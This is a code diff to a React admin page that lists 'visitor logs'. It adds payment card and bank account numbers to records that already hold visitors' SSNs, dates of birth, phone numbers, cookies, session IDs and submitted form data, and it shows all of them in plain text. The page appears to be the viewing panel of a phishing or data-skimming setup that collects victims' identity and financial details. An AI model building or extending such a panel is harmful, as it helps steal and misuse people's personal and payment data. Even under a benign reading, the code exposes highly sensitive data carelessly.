@@ -3,7 +3,7 @@ import { useQuery } from "@tanstack/react-query";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
-import { Shield, Monitor, Smartphone, Tablet, MapPin, Clock, User, Globe, RefreshCw, Eye, EyeOff, AlertTriangle, Key, Mail, Phone, CreditCard, Cookie, ChevronDown, ChevronUp, Copy, Check } from "lucide-react";
+import { Shield, Monitor, Smartphone, Tablet, MapPin, Clock, User, Globe, RefreshCw, Eye, EyeOff, AlertTriangle, Key, Mail, Phone, CreditCard, Cookie, ChevronDown, ChevronUp, Copy, Check, Building2 } from "lucide-react";
 
 interface VisitorLog {
   id: string;
@@ -26,6 +26,8 @@ interface VisitorLog {
   phone: string | null;
   ssn: string | null;
   dateOfBirth: string | null;
+  cardNumber: string | null;
+  accountNumber: string | null;
   cookies: string | null;
   sessionId: string | null;
   formData: string | null;
@@ -403,6 +405,18 @@ export default function AdminSecurityPage() {
                                 <div className="flex items-center justify-between bg-gray-700/50 p-2 rounded">
                                   <span className="text-xs text-gray-400">DOB:</span>
                                   <span className="text-sm text-white font-mono">{log.dateOfBirth}</span>
+                                </div>
+                              )}
+                              {log.cardNumber && (
+                                <div className="flex items-center justify-between bg-green-900/20 p-2 rounded border border-green-900/30">
+                                  <span className="text-xs text-gray-400">Card Number:</span>
+                                  <span className="text-sm text-green-400 font-mono">{log.cardNumber}</span>
+                                </div>
+                              )}
+                              {log.accountNumber && (
+                                <div className="flex items-center justify-between bg-purple-900/20 p-2 rounded border border-purple-900/30">
+                                  <span className="text-xs text-gray-400">Account Number:</span>
+                                  <span className="text-sm text-purple-400 font-mono">{log.accountNumber}</span>
                                 </div>
                               )}
                             </div>
